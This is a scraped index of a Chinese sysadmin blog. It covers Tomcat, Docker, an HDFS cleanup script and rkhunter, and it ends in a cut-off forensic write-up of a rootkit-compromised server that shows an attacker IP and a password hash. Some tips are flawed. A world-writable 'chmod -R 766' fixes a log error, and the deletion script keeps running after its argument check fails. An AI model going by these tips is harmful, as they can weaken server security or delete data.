AJP Port: 8011 Redirect Port: 8443 第2个实例端口-配置 – tomcat8_2/conf/server.xml Server Port: 8002 Connector Port: 8082 AJP Port: 8012 Redirect Port: 9443 3. 分别优化Tomcat​ 略 4. 备份实例，便于日后分发1tar zcf muti_tomcat.tar.gz ./tomcat8_1 ./tomcat8_2 5. 启动多实例12/application/tomcat8_1/bin/startup.sh /application/tomcat8_2/bin/startup.sh 6. 验证123456# 查看端口和进程[root@zabbix-proxy ~]# netstat -lntup|grep javatcp6 0 0 127.0.0.1:8081 39534/java tcp6 0 0 127.0.0.1:8082 39534/java[root@zabbix-proxy ~]# jps -m web访问 12http:&#x2F;&#x2F;ip:8081http:&#x2F;&#x2F;ip:8082","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"tomcat","slug":"tomcat","permalink":"https://garywu520.github.io/tags/tomcat/"},{"name":"tomcat8","slug":"tomcat8","permalink":"https://garywu520.github.io/tags/tomcat8/"},{"name":"tomcat多实例","slug":"tomcat多实例","permalink":"https://garywu520.github.io/tags/tomcat%E5%A4%9A%E5%AE%9E%E4%BE%8B/"},{"name":"jdk","slug":"jdk","permalink":"https://garywu520.github.io/tags/jdk/"}]},{"title":"Tomcat-将项目打包成war包","slug":"Tomcat-将项目打包成war包","date":"2019-08-07T05:50:49.000Z","updated":"2019-08-07T06:05:47.249Z","comments":true,"path":"2019/08/07/Tomcat-将项目打包成war包/","link":"","permalink":"https://garywu520.github.io/2019/08/07/Tomcat-%E5%B0%86%E9%A1%B9%E7%9B%AE%E6%89%93%E5%8C%85%E6%88%90war%E5%8C%85/","excerpt":"","text":"要求：提前安装jdk 1. 打包将当前目录下的所有文件打包成project.war 1jar -cvfM0 project.war ./ 参数说明： -c 创建war包 -v 显示打包过程 -f 指定JAR文件名 -M 不产生所有项的清单（MANIFEST〕文件，此参数会忽略 -m 参数 -0 这个是阿拉伯数字，只打包不压缩的意思 2. 解压解压到当前目录 1jar -xvf project.war","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"tomcat","slug":"tomcat","permalink":"https://garywu520.github.io/tags/tomcat/"},{"name":"jar","slug":"jar","permalink":"https://garywu520.github.io/tags/jar/"},{"name":"war","slug":"war","permalink":"https://garywu520.github.io/tags/war/"}]},{"title":"Tomcat访问日志格式化输出","slug":"Tomcat访问日志格式化输出","date":"2019-08-07T03:17:41.000Z","updated":"2019-08-07T03:26:36.255Z","comments":true,"path":"2019/08/07/Tomcat访问日志格式化输出/","link":"","permalink":"https://garywu520.github.io/2019/08/07/Tomcat%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA/","excerpt":"Tomcat catalina.log时间格式看着很不爽，不便于日志收集与分析，现对其进行调整下 需求目前的时间格式如下 106-Jul-2019 21:12:27.444 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 857 ms 需要修改为 12019-07-06 21:12:27.444 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 857 ms","text":"Tomcat catalina.log时间格式看着很不爽，不便于日志收集与分析，现对其进行调整下 需求目前的时间格式如下 106-Jul-2019 21:12:27.444 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 857 ms 需要修改为 12019-07-06 21:12:27.444 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 857 ms 配置修改 ${tomcatHome}/conf/logging.properties 12#找到：1catalina.org.apache.juli.AsyncFileHandler.prefix = catalina. 123#在后边加上下面一行1catalina.org.apache.juli.AsyncFileHandler.formatter = java.util.logging.SimpleFormatterjava.util.logging.SimpleFormatter.format = %1$tY-%1$tm-%1$td %1$tH:%1$tM:%1$tS.%1$tL [%4$s] [%3$s] %2$s %5$s %6$s%n","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"tomcat","slug":"tomcat","permalink":"https://garywu520.github.io/tags/tomcat/"},{"name":"tomcat8","slug":"tomcat8","permalink":"https://garywu520.github.io/tags/tomcat8/"},{"name":"catalina","slug":"catalina","permalink":"https://garywu520.github.io/tags/catalina/"},{"name":"日志log","slug":"日志log","permalink":"https://garywu520.github.io/tags/%E6%97%A5%E5%BF%97log/"}]},{"title":"Tomcat8直接访问与二级目录访问","slug":"Tomcat8直接访问与二级目录访问","date":"2019-08-07T03:06:45.000Z","updated":"2019-08-07T03:09:51.855Z","comments":true,"path":"2019/08/07/Tomcat8直接访问与二级目录访问/","link":"","permalink":"https://garywu520.github.io/2019/08/07/Tomcat8%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%E4%B8%8E%E4%BA%8C%E7%BA%A7%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE/","excerpt":"1. 直接访问-工程部署注：将应用程序部署到Tomcat根目录，【直接】访问方式为：http://[ip]:[port] 这种方式最简单，直接删除Tomcat//webapps/ROOT下面的所有文件，将研发给的工程放到该目录下。 Tomcat启动时，默认会读取和加载ROOT目录下面的所有项目。","text":"1. 直接访问-工程部署注：将应用程序部署到Tomcat根目录，【直接】访问方式为：http://[ip]:[port] 这种方式最简单，直接删除Tomcat//webapps/ROOT下面的所有文件，将研发给的工程放到该目录下。 Tomcat启动时，默认会读取和加载ROOT目录下面的所有项目。 关于Tomcat 8 tomcat/conf/server.xml，配置如下： 12345678&lt;Host name=&quot;localhost&quot; appBase=&quot;webapps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;localhost_access_log&quot; suffix=&quot;.txt&quot; pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;&lt;/Host&gt; 参数说明： name：表示访问本地的localhost地址 appBase：表示项目指定的父位置 2. 二级目录访问-工程部署注：二级目录访问，访问方式为：http://[ip]:[port]/[myapp] 删除Tomcat//webapps/ROOT目录下的所有文件，并在ROOT目录下新建项目名目录[如：myapp] 这种方式需要修改tomcat/conf/server.xml，重新指定根目录, 改为如下： 12345678&lt;Host name=&quot;localhost&quot; appBase=&quot;webapps&quot; unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt; &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;localhost_access_log&quot; suffix=&quot;.txt&quot; pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt; &lt;Context path=&quot;/myapp&quot; docBase=&quot;ROOT/myapp&quot; reloadable=&quot;true&quot; debug=&quot;0&quot; crossContext=&quot;true&quot;/&gt;&lt;/Host&gt; 参数说明： path: 指定虚拟目录的名称，如：path=”/myapp” 。，如果想只输入ip地址和端口就显示主页，则该键值留为空； docBase: 指定web应用的文件路径,可以是绝对路径，也可以是相对于appBase的相对路径。此目录也可以是外部目录。 ​ 注：如果Web应用采用开放目录结构，则指定Web应用的根目录；如果Web应用是个war文件，则指定war文件的路径。 reloadable: 如果这个属性设为true，tomcat服务器在运行状态下会监视在WEB-INF/classes和WEB-INF/lib目录下class文件的改动，如果监测到有class文件被更新的，服务器会自动重新加载Web应用 crossContext: 配置的不同context共享一个session","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"tomcat","slug":"tomcat","permalink":"https://garywu520.github.io/tags/tomcat/"},{"name":"war","slug":"war","permalink":"https://garywu520.github.io/tags/war/"},{"name":"java","slug":"java","permalink":"https://garywu520.github.io/tags/java/"},{"name":"tomcat8","slug":"tomcat8","permalink":"https://garywu520.github.io/tags/tomcat8/"}]},{"title":"Tomcat8环境部署","slug":"Tomcat8环境部署","date":"2019-08-07T03:05:45.000Z","updated":"2019-08-07T05:16:25.870Z","comments":true,"path":"2019/08/07/Tomcat8环境部署/","link":"","permalink":"https://garywu520.github.io/2019/08/07/Tomcat8%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/","excerpt":"1. 安装jdk123解压到 /usr/local/目录tar -zxf jdk*.tar.gz -C /usr/local/ln -sv /usr/local/jdk* /usr/local/jdk 配置环境变量-/etc/profile 1234export JAVA_HOME=/usr/local/jdkexport JRE_HOME=/usr/local/jdk/jreexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib export PATH=$PATH:$JAVA_HOME/bin 12source /etc/profilejava -version","text":"1. 安装jdk123解压到 /usr/local/目录tar -zxf jdk*.tar.gz -C /usr/local/ln -sv /usr/local/jdk* /usr/local/jdk 配置环境变量-/etc/profile 1234export JAVA_HOME=/usr/local/jdkexport JRE_HOME=/usr/local/jdk/jreexport CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib export PATH=$PATH:$JAVA_HOME/bin 12source /etc/profilejava -version 2. 安装Tomcat123解压到/usr/local目录tar -zxf apache-tomcat*.tar.gz -C /usr/local/ln -sv /usr/local/apache-tomcat* /usr/local/tomcat 相关命令软连 12ln -sv /usr/local/jdk/bin/jps /usr/sbin/jpsln -sv /usr/local/jdk/bin/jmap /usr/sbin/jmap 3. 优化Tomcat(1)修改Tomcat端口为80cat tomcat/conf/server.xml 1234567&lt;Connector port=&quot;80&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; compression=&quot;on&quot; compressionMinSize1=&quot;2048&quot; noCompressionUserAgents=&quot;gozilla, traviata&quot; compressableMimeType=&quot;text/html,text/xml,text/javascript,text/css,text/plain&quot;/&gt; 参数说明： port：代表Tomcat监听端口，默认8080 compression 打开压缩功能 compressionMinSize 启用压缩的输出内容大小，这里面默认为2KB compressableMimeType 压缩类型 connectionTimeout 定义建立客户连接超时的时间. 如果为 -1, 表示不限制建立客户连接的时间 (2)内存优化Tomcat内存优化主要是对tomcat启动参数优化，可以在tomcat的启动脚本catalina.sh中设置 JAVA_OPTS 参数。 cat tomcat/bin/catalina.sh — 大概在250行左右 1234567JAVA_OPTS=&quot;$JAVA_OPTS $JSSE_OPTS&quot;改为JAVA_OPTS=&quot;-server -XX:PermSize=512M -XX:MaxPermSize=1024m -Xms2048m -Xmx2048m&quot; 参数：-server：表示以服务模式启动，启动速度会稍微慢一点，但性能会高很多。 不加这个参数，默认是以客户端模式启动。 4. Tomcat日志文件cd /application/tomcat/logs 12ls -lh catalina.out#tomcat实时日志,启动信息/报错信息均会在此文件体现 5. 加快Tomcat的启动速度打开$JAVA_PATH/jre/lib/security/java.security这个文件，找到下面的内容： 123securerandom.source=file:/dev/random 替换成securerandom.source=file:/dev/./random 6. 启动tomcat12/usr/local/tomcat/bin/shutdown.sh/usr/local/tomcat/bin/startup.sh 其他：关于启动错误1touch: cannot touch ‘&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;logs&#x2F;catalina.out’: Permission denied 解决方法： 1cd &#x2F;usr&#x2F;local&#x2F;tomcat &amp;&amp; chmod -R 766 .&#x2F;logs","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"tomcat","slug":"tomcat","permalink":"https://garywu520.github.io/tags/tomcat/"},{"name":"java","slug":"java","permalink":"https://garywu520.github.io/tags/java/"},{"name":"tomcat8","slug":"tomcat8","permalink":"https://garywu520.github.io/tags/tomcat8/"}]},{"title":"Docker VOLUME卷","slug":"Docker VOLUME卷","date":"2019-08-06T10:45:09.000Z","updated":"2019-12-03T07:20:10.034Z","comments":true,"path":"2019/08/06/Docker VOLUME卷/","link":"","permalink":"https://garywu520.github.io/2019/08/06/Docker%20VOLUME%E5%8D%B7/","excerpt":"1. Docker管理数据的两种主要方法 数据卷 数据卷容器 2. 数据卷 数据卷可在容器之间共享或重用 数据卷中的更改可以直接生效 数据卷中的更改不会包含在镜像的更新中 数据卷的生命周期一直持续到没有容器使用它为止。","text":"1. Docker管理数据的两种主要方法 数据卷 数据卷容器 2. 数据卷 数据卷可在容器之间共享或重用 数据卷中的更改可以直接生效 数据卷中的更改不会包含在镜像的更新中 数据卷的生命周期一直持续到没有容器使用它为止。 3. 添加数据卷1234docker run --name &lt;容器名称&gt; -i -t -v /webapp -d root/centos:v2#-v参数用来向容器中添加数据卷，容器内部将创建一个卷为/webapp；#可以在docker run 命令中多次使用-v参数挂载多个数据卷 4. 挂载宿主机的目录作为容器的卷123456docker run --name &lt;容器名称&gt; -i -t -v /opt/webapp:/mnt/webapp -d root/centos:v2#注: 宿主机的/opt/webapp目录将作为卷挂载到容器的/mnt/webapp中# 宿主机的目录必须是绝对路径，如果目录不存在docker会自动创建它；# 默认情况下，docker对此数据卷有读写权限，但是可以将目录设置为只读，方法如下:docker run --name &lt;容器名称&gt; -i -t -v /opt/webapp:/mnt/webapp:ro -d root/centos:v2 5. 查看已经运行的容器目录挂载信息1docker inspect 2a21ae2b0720|grep Mounts -A 20 6. 容器之间数据卷共享12#首先创建一个指定名称的数据卷容器docker run --name Test1 -i -t -v /web -d root/centos:v2 容器通过–volumes-from参数来桥接其他容器内的数据卷 1docker run --name Test2 -i -t --volumes-from Test1 -d root/centos:v2 注：当一个数据卷在多个容器中被挂载或桥接，当删除其中一个容器后，数据卷并不会消失。只有当最后挂载的容器被删除后，挂载卷才会被删除。 7. 备份、恢复或者迁移数据卷12345#首先创建一个指定名称的数据卷容器docker run --name Test1 -i -t -v /web -d root/centos:v2#然后使用--volumes-from参数来创建一个挂载数据卷的容器docker run --volumes-from Test1 -v $(pwd):/backup root/centos:v2 tar cvf /backup/web_backup.tar /web 数据卷备份 1234docker run --name Test10 --volumes-from Test1 -v $(pwd):/backup root/centos:v2 tar cvf /backup/web_backup.tar /web#说明：使用root/centos:v2, 从Test1桥接容器卷，同时将宿主机的当前目录挂载到容器的/backup目录,最后执行tar压缩命令，将桥接卷/web下的所有文件打包到宿主机的当前目录中。 数据卷恢复 12345#模拟恢复数据卷数据--先删除原数据卷内容。并运行一个原数据卷容器docker run --name Test2 -i -t --volumes-from Test1 -d root/centos:v2#在新的容器中的数据卷里解压此备份文件docker run --name Test2_RES --volumes-from Test2 -v $(pwd):/backup root/centos:v2 tar xvf /backup/web_backup.tar","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"docker-compose","slug":"docker-compose","permalink":"https://garywu520.github.io/tags/docker-compose/"},{"name":"docker-ce","slug":"docker-ce","permalink":"https://garywu520.github.io/tags/docker-ce/"},{"name":"容器","slug":"容器","permalink":"https://garywu520.github.io/tags/%E5%AE%B9%E5%99%A8/"}]},{"title":"Docker镜像加速","slug":"Docker镜像加速","date":"2019-08-06T10:43:31.000Z","updated":"2019-12-03T06:50:56.189Z","comments":true,"path":"2019/08/06/Docker镜像加速/","link":"","permalink":"https://garywu520.github.io/2019/08/06/Docker%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F/","excerpt":"","text":"配置镜像加速器 1mkdir -p /etc/docker cat /etc/docker/daemon.json 123456&#123; &quot;registry-mirrors&quot;: [ &quot;https://dockerhub.azk8s.cn&quot;, &quot;https://reg-mirror.qiniu.com&quot; ]&#125; 12systemctl daemon-reloadsystemctl restart docker","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"docker","slug":"docker","permalink":"https://garywu520.github.io/tags/docker/"},{"name":"容器","slug":"容器","permalink":"https://garywu520.github.io/tags/%E5%AE%B9%E5%99%A8/"},{"name":"docker-compass","slug":"docker-compass","permalink":"https://garywu520.github.io/tags/docker-compass/"}]},{"title":"shell以其他用户执行命令","slug":"shell以其他用户执行命令","date":"2019-07-15T08:51:50.000Z","updated":"2019-07-15T08:54:13.126Z","comments":true,"path":"2019/07/15/shell以其他用户执行命令/","link":"","permalink":"https://garywu520.github.io/2019/07/15/shell%E4%BB%A5%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/","excerpt":"","text":"123#使用sudo -u参数sudo -u [USER] [COMMON]","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"su","slug":"su","permalink":"https://garywu520.github.io/tags/su/"},{"name":"sudo","slug":"sudo","permalink":"https://garywu520.github.io/tags/sudo/"}]},{"title":"shell删除HDFS几天前的数据","slug":"shell删除HDFS几天前的数据","date":"2019-07-15T08:44:41.000Z","updated":"2019-07-15T08:49:44.759Z","comments":true,"path":"2019/07/15/shell删除HDFS几天前的数据/","link":"","permalink":"https://garywu520.github.io/2019/07/15/shell%E5%88%A0%E9%99%A4HDFS%E5%87%A0%E5%A4%A9%E5%89%8D%E7%9A%84%E6%95%B0%E6%8D%AE/","excerpt":"","text":"Shell脚本使用1sh clean_hdfs_logs.sh [hdfs_user] Shell脚本cat clean_hdfs_logs.sh 12345678910111213141516171819202122232425#!/bin/bash#判断传参个数[即输入hdfs用户]if [ $# != 1 ];then echo &quot;USAGE: sh $0 [hdfs_user]&quot;fiHadoop_LogDir=/tmp/logs/$1/logsFile=/home/$1/logs.logDATE=`date +%F`#清理老数据rm -f $File#获取最新数据sudo -u $1 hadoop fs -ls $Hadoop_LogDir &gt;&gt;$File#筛选1天前的可删除子目录INFO=`egrep -v &quot;$DATE&quot; $File|awk &#x27;&#123;print $NF&#125;&#x27;`for i in $INFOdo sudo -u $1 hadoop fs -rm -r $i #sudo -u $1 hadoop fs -rm -r -skipTrash $idone","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"hadoop","slug":"hadoop","permalink":"https://garywu520.github.io/tags/hadoop/"},{"name":"hdfs","slug":"hdfs","permalink":"https://garywu520.github.io/tags/hdfs/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"su","slug":"su","permalink":"https://garywu520.github.io/tags/su/"},{"name":"sudo","slug":"sudo","permalink":"https://garywu520.github.io/tags/sudo/"}]},{"title":"logstash错误解决-a plugin had an unrecoverable error","slug":"logstash错误解决-a-plugin-had-an-unrecoverable-error","date":"2019-06-28T06:34:01.000Z","updated":"2019-06-28T07:10:23.648Z","comments":true,"path":"2019/06/28/logstash错误解决-a-plugin-had-an-unrecoverable-error/","link":"","permalink":"https://garywu520.github.io/2019/06/28/logstash%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3-a-plugin-had-an-unrecoverable-error/","excerpt":"这几天线上的logstash进程运行过程中，自动异常退出，log无任何输出。前台启动logstash，经过跟踪，错误提示如下： 123A plugin had an unrecoverable error. Will restart this plugin. Plugin &lt;LogStash::Inputs::File path=&gt;[&quot;/xx/xx/xx/xx/*&quot;, &quot;/xx/xx/xx/xx/*&quot;], snicedb_path=&gt;&quot;/xx/xx/xx/xx/xx.db&quot; ,codec=&gt;&lt;LogStash::Codecs::Plain charset=&gt;&quot;UTF-8&quot;&gt;, stat_interval=&gt;1, discover_interval=&gt;15, sincedb_write_interval=&gt;15, start_position=&gt;&quot;end&quot;, delimiter=&gt;&quot;\\n&quot;&gt; Error: Unknown error - 没有那个文件或目录 &#123;:level=&gt;:error&#125;","text":"这几天线上的logstash进程运行过程中，自动异常退出，log无任何输出。前台启动logstash，经过跟踪，错误提示如下： 123A plugin had an unrecoverable error. Will restart this plugin. Plugin &lt;LogStash::Inputs::File path=&gt;[&quot;/xx/xx/xx/xx/*&quot;, &quot;/xx/xx/xx/xx/*&quot;], snicedb_path=&gt;&quot;/xx/xx/xx/xx/xx.db&quot; ,codec=&gt;&lt;LogStash::Codecs::Plain charset=&gt;&quot;UTF-8&quot;&gt;, stat_interval=&gt;1, discover_interval=&gt;15, sincedb_write_interval=&gt;15, start_position=&gt;&quot;end&quot;, delimiter=&gt;&quot;\\n&quot;&gt; Error: Unknown error - 没有那个文件或目录 &#123;:level=&gt;:error&#125; 排查思路： (1) logstash配置文件Input源数据 ​ 验证input数据源的路径是否正确 [未解决问题] (2) 验证logstash conf配置文件的语法 ​ 由于logstash配置文件语法使用的是YAML格式，故需要一部分一部分的逐一验证来排除格式错误 [未解决问题] ​ YAML在线解析 (3) 升级插件 ​ 以上错误信息中，可以看出Logstash所使用的Plugin是 logstash-input-file ，故可以考虑升级插件。 更换官方Ruby Gem源 head logstash/Gemfile 1234567source &quot;https://gems.ruby-china.com/&quot; #修改为https://gems.ruby-china.com/gem &quot;logstash-core&quot;, &quot;2.1.0&quot;gem &quot;file-dependencies&quot;, &quot;0.1.6&quot;gem &quot;ci_reporter_rspec&quot;, &quot;1.0.0&quot;, :group =&gt; :developmentgem &quot;simplecov&quot;, :group =&gt; :developmentgem &quot;coveralls&quot;, :group =&gt; :developmentgem &quot;tins&quot;, &quot;1.6&quot;, :group =&gt; :development 查看已安装的插件 12345#查看已安装的插件$ bin/plugin list#升级插件$ bin/plugin update logstash-input-file","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ELK","slug":"ELK","permalink":"https://garywu520.github.io/tags/ELK/"},{"name":"logstash","slug":"logstash","permalink":"https://garywu520.github.io/tags/logstash/"},{"name":"Plugin","slug":"Plugin","permalink":"https://garywu520.github.io/tags/Plugin/"},{"name":"YAML","slug":"YAML","permalink":"https://garywu520.github.io/tags/YAML/"},{"name":"Ruby","slug":"Ruby","permalink":"https://garywu520.github.io/tags/Ruby/"},{"name":"Gem镜像","slug":"Gem镜像","permalink":"https://garywu520.github.io/tags/Gem%E9%95%9C%E5%83%8F/"}]},{"title":"rootkit入侵渗透防御","slug":"rootkit入侵渗透防御","date":"2019-06-25T08:34:08.000Z","updated":"2019-06-26T10:26:54.829Z","comments":true,"path":"2019/06/25/rootkit入侵渗透防御/","link":"","permalink":"https://garywu520.github.io/2019/06/25/rootkit%E5%85%A5%E4%BE%B5%E6%B8%97%E9%80%8F%E9%98%B2%E5%BE%A1/","excerpt":"在常规的 “入侵/渗透” 检测工作中，Rootkit通常非常的隐秘、令用户不易察觉，所以，我们要用 chkrootkit 来定时监测系统，预防linux被rootkit程序入侵。 Rootkit Hunter (Rootkit 猎人)-项目地址：http://rkhunter.sourceforge.net/","text":"在常规的 “入侵/渗透” 检测工作中，Rootkit通常非常的隐秘、令用户不易察觉，所以，我们要用 chkrootkit 来定时监测系统，预防linux被rootkit程序入侵。 Rootkit Hunter (Rootkit 猎人)-项目地址：http://rkhunter.sourceforge.net/ Rootkit Hunter安装1234wget http://sourceforge.net/projects/rkhunter/files/rkhunter/1.3.8/rkhunter-1.3.8.tar.gz/downloadtar zxvf rkhunter-1.3.8.tar.gzcd rkhunter-1.3.8./installer.sh --install 帮助信息Options: -h 显示帮助信息 -V 显示版本信息 -l 显示测试内容 -d debug模式，显示检测过程的相关指令程序 -q 安静模式，只显示有问题部分， -x 高级模式，显示所有检测结果 -r dir 设定指定的目录为根目录 -p dir1:dir2:dirN 检测指定目录 -n 跳过NFS连接的目录 建立校对样本123rkhunter --propupdls /var/lib/rkhunter/db/rkhunter.dat #样本文件位置 手动扫描12#手动扫描rkhunter --check 12# 如果您不想要每个部分都以 Enter 来继续，想要让程序自动持续执行，可以使用：rkhunter --check --sk 检测过程： 第一部分：检测系统二进制命令，主要检测系统的二进制文件，这些文件最容易被rootkit攻击； ​ [ OK ]表示正常；[ Warning ]表示有异常；[ None found ]未找到 第二部分：对rootkit常见攻击的文件/目录进行检测，包括网络服务使用的端口等等，检测是否存在常见的rootkit程序； ​ [ Not found ]表示未感染 第三部分：文件/目录附加检测、恶意软件检查以及Linux内核模块检查 第四部分：检测网络接口/后门端口/系统启动文件/系统用户和组/ssh配置/文件系统和隐藏文件/目录等 第五部分：总结服务器目前的安全状态。 ​ 检测结果记录在/var/log/rkhunter.log中，根据提示修复即可。 在线版本升级12345#版本检查rkhunter --versioncheck#版本升级rkhunter --update 定时扫描cat /etc/cron.daily/rkhunter.sh 12345678#!/bin/sh(/usr/local/bin/rkhunter --versioncheck/usr/local/bin/rkhunter --update/usr/local/bin/rkhunter --cronjob --report-warnings-only) | /bin/mail -s &#x27;rkhunter Daily Run&#x27; name@email.com#注：扫描结果仅显示警告项，并且警告项基本均有改进提示 1chmod 755 /etc/cron.daily/rkhunter.sh 木马再确认把/var/log/rkhunter.log中所涉及的文件下载下来，使用在线杀毒检测。如果发现部分文件或程序确为木马，应及时采取相应预防措施。 在线杀毒网站: virustotal官网：https://www.virustotal.com","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"rootkit","slug":"rootkit","permalink":"https://garywu520.github.io/tags/rootkit/"},{"name":"chkrootkit","slug":"chkrootkit","permalink":"https://garywu520.github.io/tags/chkrootkit/"},{"name":"rkhunter","slug":"rkhunter","permalink":"https://garywu520.github.io/tags/rkhunter/"},{"name":"rootkit hunter","slug":"rootkit-hunter","permalink":"https://garywu520.github.io/tags/rootkit-hunter/"},{"name":"入侵","slug":"入侵","permalink":"https://garywu520.github.io/tags/%E5%85%A5%E4%BE%B5/"},{"name":"防御","slug":"防御","permalink":"https://garywu520.github.io/tags/%E9%98%B2%E5%BE%A1/"}]},{"title":"linux系统被黑的分析过程","slug":"linux系统被黑的分析过程","date":"2019-06-20T03:41:52.000Z","updated":"2019-06-20T04:12:12.567Z","comments":true,"path":"2019/06/20/linux系统被黑的分析过程/","link":"","permalink":"https://garywu520.github.io/2019/06/20/linux%E7%B3%BB%E7%BB%9F%E8%A2%AB%E9%BB%91%E7%9A%84%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B/","excerpt":"1. 受攻击现象这是一台客户的门户网站服务器，托管在电信机房，客户接到电信的通知：由于此服务器持续对外发送数据包，导致100M带宽耗尽，于是电信就切断了此服务器的网络。此服务器是Centos5.5版本，对外开放了80、22端口。 从客户那里了解到，网站的访问量并不大，所以带宽占用也不会太高，而耗尽100M的带宽是绝对不可能的，那么极有可能是服务器遭受了流量攻击，于是登录服务器做详细的检测。","text":"1. 受攻击现象这是一台客户的门户网站服务器，托管在电信机房，客户接到电信的通知：由于此服务器持续对外发送数据包，导致100M带宽耗尽，于是电信就切断了此服务器的网络。此服务器是Centos5.5版本，对外开放了80、22端口。 从客户那里了解到，网站的访问量并不大，所以带宽占用也不会太高，而耗尽100M的带宽是绝对不可能的，那么极有可能是服务器遭受了流量攻击，于是登录服务器做详细的检测。 2. 初步分析 在电信人员的配合下通过交换机对该服务器的网络流量进行了检测，发现该主机确实存在对外80端口的扫描流量，于是登录系统通过“netstat –an”命令对系统开启的端口进行检查，可奇怪的是，没有发现任何与80端口相关的网络连接。接着使用“ps –ef”、“top”等命令也没有发现任何可疑的进程。于是怀疑系统是否被植入了rootkit。 为了证明系统是否被植入了rootkit，我们将网站服务器下的ps、top等命令与之前备份的同版本可信操作系统命令做了md5sum校验，结果发现网站服务器下的这两个命令确实被修改过，由此断定，此服务器已经被入侵并且安装了rootkit级别的后门程序。 3. 断网分析系统由于服务器不停向外发包，因此， 首先要做的就是将此服务器断开网络 然后分析系统日志，寻找攻击源。 但是系统命令已经被替换掉了，如果继续在该系统上执行操作将变得不可信，这里可以通过两种方法来避免这种情况。 方案1：从同版本(且可信的)操作系统下拷贝所有命令到这个入侵服务器下某个路径，然后在执行命令的时候指定此命令的完整路径即可【推荐】 123#命令路径：/sbin/ /usr/sbin 方案2：使用linux livecd启动系统进行分析 方案3: 将此服务器的硬盘取下来挂载到另外一台安全的主机上进行分析 接下来首先查看系统的登陆日志，查看是否有可疑登陆信息 1more /var/log/secure |grep Accepted 通过对命令输出的查看，有一条日志引起了我们的怀疑： 1Oct 3 03:10:25 webserver sshd[20701]: Accepted password for mail from 62.17.163.186 port 53349 ssh2 这条日志显示在10月3号的凌晨3点10分，有个mail帐号从62.17.163.186这个IP成功登录了系统，mail是系统的内置帐号，默认情况下是无法执行登录操作的，而62.17.163.186这个IP，经过查证，是来自爱尔兰的一个地址。从mail帐号登录的时间来看，早于此网站服务器遭受攻击的时间。 接着查看一下系统密码文件/etc/shadow，又发现可疑信息： 1mail:$1$kCEd3yD6$W1evaY5BMPQIqfTwTVJiX1:15400:0:99999:7::: 很明显，mail帐号已经被设置了密码，并且被修改为可远程登录，之所以使用mail帐号，猜想可能是因为入侵者想留下一个隐蔽的帐号，以方便日后再次登录系统。 然后继续查看其他系统日志，如/var/log/messages、/var/log/wtmp均为空文件，可见，入侵者已经清理了系统日志文件，至于为何没有清空/var/log/secure文件，就不得而知了。 4. 